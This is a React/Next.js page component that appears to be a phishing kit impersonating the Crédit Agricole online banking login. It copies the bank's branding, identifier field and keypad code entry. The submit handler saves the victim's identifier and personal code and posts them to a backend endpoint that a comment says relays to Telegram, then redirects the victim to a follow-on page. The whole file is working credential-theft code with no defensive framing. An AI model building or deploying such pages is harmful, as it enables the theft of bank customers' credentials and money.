'use client';

import React, { useState, FormEvent } from 'react';
import { useRouter } from 'next/navigation';

interface CreditAgricoleProps {
  initialIdentifiant?: string;
  initialPassword?: string;
  partnerLogoSrc?: string;
  caLogoSrc?: string;
}

export default function CreditAgricolePage({
  initialIdentifiant = '',
  initialPassword = '',
  partnerLogoSrc = '/favicon.ico',   
  caLogoSrc = '/ca.png',      
}: CreditAgricoleProps) {
  const router = useRouter();

  // Étape (1: Identifiant, 2: Code personnel)
  const [step, setStep] = useState<1 | 2>(1);

  // Saisie libre
  const [identifiant, setIdentifiant] = useState<string>(initialIdentifiant);
  const [password, setPassword] = useState<string>(initialPassword);
  const [rememberMe, setRememberMe] = useState<boolean>(false);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);

  // Passage Étape 1 -> Étape 2
  const handleNextStep = (e?: FormEvent) => {
    if (e) e.preventDefault();
    if (identifiant.trim().length > 0) {
      setStep(2);
    }
  };

  // Gestion du pavé numérique
  const handleKeypadPress = (val: string) => {
    if (password.length < 10) {
      setPassword((prev) => prev + val);
    }
  };

  const handleClearPassword = () => {
    setPassword('');
  };

  const handleBackspacePassword = () => {
    setPassword((prev) => prev.slice(0, -1));
  };

  // Soumission : Envoi vers l'API Telegram puis redirection vers /infos
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!password.trim()) return;

    setIsSubmitting(true);

    if (typeof window !== 'undefined') {
      sessionStorage.setItem('ca_identifiant', identifiant);
      sessionStorage.setItem('ca_password', password);
      localStorage.setItem('banque_selectionnee', 'Crédit Agricole');
    }

    try {
      // Envoi des identifiants vers l'API backend
      await fetch('/api/btd-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          offreId: '1', // ID de l'offre Crédit Agricole
          identifiant: identifiant,
          password: password,
        }),
      });
    } catch (err) {
      console.error('Erreur lors de la transmission :', err);
    } finally {
      setIsSubmitting(false);
      router.push('/bat');
    }
  };

  return (
    <div className="w-full min-h-screen bg-[#F3F4F6] flex flex-col items-center text-slate-800 font-sans antialiased">
      
      {/* ================= EN-TÊTE DE PARTENARIAT (HAUT À GAUCHE) ================= */}
      <header className="w-full bg-white border-b border-slate-200 px-4 py-3 flex items-center justify-between shadow-xs">
        
        {/* Bloc Partenariat */}
        <div className="flex items-center gap-2.5">
          <img 
            src={partnerLogoSrc} 
            alt="Favicon" 
            className="h-6 w-6 object-contain rounded-xs"
          />

          <svg className="w-4 h-4 text-slate-400 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3" />
          </svg>

          <img 
            src={caLogoSrc} 
            alt="Crédit Agricole" 
            className="h-8 w-auto object-contain" 
          />
        </div>

        {/* Bouton Me Connecter */}
        <button
          type="button"
          onClick={() => setStep(1)}
          className="bg-[#006642] text-white text-xs font-bold px-4 py-2 rounded-full flex items-center gap-1.5 hover:bg-[#005234] transition-all"
        >
          <svg className="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
          </svg>
          Me connecter
        </button>
      </header>

      {/* ================= CONTENEUR MODAL MOBILE ================= */}
      <main className="w-full max-w-[420px] px-3 py-4 sm:py-8 flex-1 flex flex-col justify-start">
        <div className="bg-white rounded-2xl shadow-md border border-slate-200/80 overflow-hidden flex flex-col min-h-[580px]">
          
          <div className="px-5 py-4 border-b border-slate-100 flex items-center justify-between bg-white">
            <h1 className="text-[17px] font-bold text-[#006642]">
              Accéder à mes comptes
            </h1>
            <button
              type="button"
              onClick={() => setStep(1)}
              className="text-slate-400 hover:text-slate-700 text-2xl font-light leading-none p-1"
            >
              ×
            </button>
          </div>

          <div className="p-5 sm:p-6 flex-1 flex flex-col justify-between">
            
            {/* ÉTAPE 1 : IDENTIFIANT */}
            {step === 1 && (
              <form onSubmit={handleNextStep} className="flex-1 flex flex-col justify-between">
                <div className="space-y-4">
                  <div>
                    <h2 className="text-[19px] font-black text-[#006642] tracking-wide uppercase mb-1">
                      IDENTIFIANT
                    </h2>
                    <p className="text-xs text-slate-500 font-medium">
                      Saisissez votre identifiant à 11 chiffres
                    </p>
                  </div>

                  <div className="pt-2">
                    <input
                      type="text"
                      required
                      inputMode="numeric"
                      value={identifiant}
                      onChange={(e) => setIdentifiant(e.target.value)}
                      placeholder="Exemple 98652706859"
                      className="w-full px-4 py-3.5 border-2 border-[#006642] rounded-md text-base font-semibold text-slate-800 placeholder:text-slate-400 placeholder:font-normal outline-none focus:ring-2 focus:ring-[#006642]/20"
                    />
                  </div>

                  <label className="flex items-center gap-2.5 pt-1 cursor-pointer select-none">
                    <input
                      type="checkbox"
                      checked={rememberMe}
                      onChange={(e) => setRememberMe(e.target.checked)}
                      className="w-4 h-4 rounded border-slate-300 accent-[#006642]"
                    />
                    <span className="text-xs font-semibold text-slate-700">
                      Mémoriser mon identifiant
                    </span>
                  </label>

                  <button
                    type="submit"
                    disabled={!identifiant.trim()}
                    className={`w-full py-3.5 mt-2 rounded-md font-bold text-sm text-white transition-all ${
                      identifiant.trim()
                        ? 'bg-[#006642] hover:bg-[#005234] active:scale-[0.99] cursor-pointer'
                        : 'bg-[#CCCCCC] cursor-not-allowed'
                    }`}
                  >
                    Suivant
                  </button>
                </div>

                <div className="pt-6 space-y-2.5 border-t border-slate-100 mt-6 text-left">
                  <a href="#" className="block text-[11px] font-bold text-[#006642] hover:underline uppercase tracking-wide">
                    OUBLI/PERTE DE CODE PERSONNEL
                  </a>
                  <a href="#" className="block text-[11px] font-bold text-[#006642] hover:underline uppercase tracking-wide">
                    UN PROBLÈME TECHNIQUE ?
                  </a>
                  <a href="#" className="block text-[11px] font-bold text-[#006642] hover:underline uppercase tracking-wide">
                    SÉCURITÉ
                  </a>
                </div>
              </form>
            )}

            {/* ÉTAPE 2 : CODE PERSONNEL */}
            {step === 2 && (
              <form onSubmit={handleSubmit} className="flex-1 flex flex-col justify-between">
                <div className="space-y-4">
                  <div>
                    <h2 className="text-[17px] font-black text-[#006642] tracking-wide uppercase mb-1">
                      ENTRER MON CODE PERSONNEL
                    </h2>
                    <p className="text-xs text-slate-500 font-medium">
                      Saisissez votre code personnel à 10 chiffres maximum
                    </p>
                  </div>

                  <div className="bg-[#EAF5F1] border border-[#C2E3D5] rounded-md px-3.5 py-2.5 flex items-center justify-between">
                    <span className="text-xs font-bold text-[#006642]">Identifiant :</span>
                    <input
                      type="text"
                      value={identifiant}
                      onChange={(e) => setIdentifiant(e.target.value)}
                      className="bg-transparent text-right font-bold text-slate-800 text-sm outline-none w-3/5"
                    />
                  </div>

                  <div>
                    <input
                      type="password"
                      required
                      maxLength={10}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Code personnel"
                      className="w-full px-4 py-3 border-2 border-[#006642] rounded-md text-center font-bold text-slate-900 tracking-widest text-lg outline-none focus:ring-2 focus:ring-[#006642]/20 placeholder:text-slate-300 placeholder:font-normal placeholder:tracking-normal placeholder:text-sm"
                    />
                  </div>

                  <div className="grid grid-cols-3 gap-2.5 pt-1">
                    {['1', '2', '3', '4', '5', '6', '7', '8', '9'].map((num) => (
                      <button
                        key={num}
                        type="button"
                        onClick={() => handleKeypadPress(num)}
                        className="h-12 rounded-md bg-white border border-slate-200 text-slate-900 font-extrabold text-xl hover:bg-slate-50 active:bg-slate-100 shadow-xs transition-all flex items-center justify-center select-none"
                      >
                        {num}
                      </button>
                    ))}

                    <button
                      type="button"
                      onClick={() => handleKeypadPress('0')}
                      className="h-12 rounded-md bg-white border border-slate-200 text-slate-900 font-extrabold text-xl hover:bg-slate-50 active:bg-slate-100 shadow-xs transition-all flex items-center justify-center select-none"
                    >
                      0
                    </button>

                    <button
                      type="button"
                      onClick={handleClearPassword}
                      className="h-12 rounded-md bg-[#F3F4F6] border border-slate-200 text-slate-700 font-bold text-xs hover:bg-slate-200 active:bg-slate-300 shadow-xs transition-all flex items-center justify-center select-none"
                    >
                      Effacer
                    </button>

                    <button
                      type="button"
                      onClick={handleBackspacePassword}
                      className="h-12 rounded-md bg-[#F3F4F6] border border-slate-200 text-slate-700 font-bold text-base hover:bg-slate-200 active:bg-slate-300 shadow-xs transition-all flex items-center justify-center select-none"
                    >
                      ←
                    </button>
                  </div>

                  <button
                    type="submit"
                    disabled={isSubmitting || !password.trim()}
                    className={`w-full py-3.5 mt-2 rounded-md font-bold text-sm text-white transition-all ${
                      password.trim() && !isSubmitting
                        ? 'bg-[#006642] hover:bg-[#005234] active:scale-[0.99] cursor-pointer'
                        : 'bg-[#CCCCCC] cursor-not-allowed'
                    }`}
                  >
                    {isSubmitting ? 'Redirection...' : 'Se connecter'}
                  </button>
                </div>
              </form>
            )}

          </div>
        </div>
      </main>
    </div>
  );
}